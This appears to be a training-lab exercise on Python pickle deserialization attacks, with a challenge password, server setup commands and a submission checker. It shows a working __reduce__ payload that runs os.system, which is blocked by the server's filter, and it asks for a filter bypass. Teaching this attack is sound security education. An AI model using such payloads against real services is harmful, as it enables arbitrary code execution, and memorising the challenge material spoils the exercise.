# Serialization Attacks

## Overview
This lab contains a server that are vulnerable to serialization attacks. Exploit the servers with a deserialization attack that creates a file on the hard drive at the path "/tmp/you-got-owned". If you successfully exploit the vulnerability the server will respond back with the message "It appears that I've been owned."


### Attacking Vulnerable Server 2

Download the challenge by asking for the data.

```
>>> d.data("bonus-pickler2")
'Zip extracted to /home/student/Desktop/bonus-pickler2'
```

Then lets extract and start the vulnerable_server2 in a new terminal window using the following commands. These commands will use 7zip to extract the password protected binary from the ~/Documents/data folder to the folder on your Desktop. If you changed where you pywars writes files to you will need to adjust the commands accordingly. The binary must be in the same folder as the files provided by pyWars.

```
$ cd ~/Desktop/bonus-pickler2/
$ 7z -paZTnTDrkiVMOCRxO2lwG2JYk0lLgUGYRnj8 x ~/Documents/data/pickle-server2.zip 
$ ./vulnerable_server2.bin
Waiting on data to deserialize...
```

Now examine the contents of serialize_me.py.  It is exactly the same as the first pickler bonus challenge.

```
$ cat ~/Desktop/bonus-pickler2/serialize_me.py 
#This object is serialize by attacker.py and sent to vulnerable_server
class MyClass(object):
      myattr = "ECHO THIS"
```

The attacker's script is also exactly the same as the first bonus-pickler challenge.  Lets run it and see what happens.

```
$ python ~/Desktop/bonus-pickler2/attacker.py 
Sending data
b'The message was :ECHO THIS'
```

This looks exactly the same! Try the solution to the last exercise to see what happens. Modify `serialize_me.py` as folllows:

```
import os

class MyClass(object):
    def __reduce__(self):
        return (os.system, ("touch /tmp/you-got-owned",))
```

Now run the attacker.py script to submit that serialized object.

```
$ python ~/Desktop/bonus-pickler2/attacker.py 
Sending data
b'A hacking attempt was blocked'
```

Drat. We've been defeated by some crafty filtering. Find a way around that!


### Submitting your answer.

After successfully exploiting vulnerable_server2 on your machine submit the file `serialize_me.py`.


```
>>> d.solution("~/Desktop/bonus-pickler2/serialize_me.py")
Correct! 
```
